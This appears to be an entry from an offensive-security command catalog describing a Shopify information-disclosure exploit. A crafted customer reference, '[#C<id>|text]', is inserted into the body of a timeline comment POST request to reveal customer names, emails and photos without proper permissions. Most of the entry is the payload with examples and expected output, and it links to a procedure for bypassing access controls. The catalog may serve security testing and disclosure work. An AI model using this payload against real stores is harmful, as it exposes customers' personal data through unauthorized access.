---
id: cmd-shopify-customer-ref
data: '[#C3502872769| anyword]'
tags:
  - exploit
  - shopify
  - disclosure
type: command
output: null
executor: http
platforms:
  - Web
created_at: '2023-10-01T00:00:00Z'
updated_at: '2025-12-14T17:24:56.783Z'
verified: false
validated: true
submitted: true
---
# Submit-Customer-Reference-in-Timeline-Comment

## Command

```http
timeline_comment[body]=[#C3502872769| anyword]
```

## Description

This command fragment is inserted into the body parameter of a POST request to /admin/transfers/<ID>/timeline_comments, using a customer reference format to disclose customer information without proper permissions.

## Parameters

| Parameter | Description | Required |
|-----------|-------------|----------|
| C<customer_ID> | Customer ID prefixed with 'C' | Yes |
| anyword | Arbitrary display text after the pipe | No |

## Examples

### Basic Usage

Insert into full POST request body:

```http
timeline_comment[body]=[#C<customer_ID>|Customer Profile]
```

### Advanced Usage

Combine with other comment text:

```http
timeline_comment[body]=Check this: [#C3502872769|John Doe]
```

## Expected Output

Customer details such as name, email address, and profile photo displayed in the rendered comment.

## Related

- [[commands/Submit-Order-Reference-in-Timeline-Comment]]
- [[procedures/Bypass-Access-Controls-via-Crafted-Comment-References]]
